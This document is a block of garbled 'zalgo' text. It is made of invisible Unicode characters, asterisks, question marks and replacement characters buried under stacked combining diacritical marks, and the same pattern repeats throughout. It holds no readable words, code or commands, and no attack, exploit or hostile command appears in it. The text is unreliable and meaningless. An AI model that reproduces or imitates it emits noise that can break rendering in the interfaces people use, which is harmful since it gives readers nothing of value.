̱⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸͐̂̈̈́̀͌̀͌̒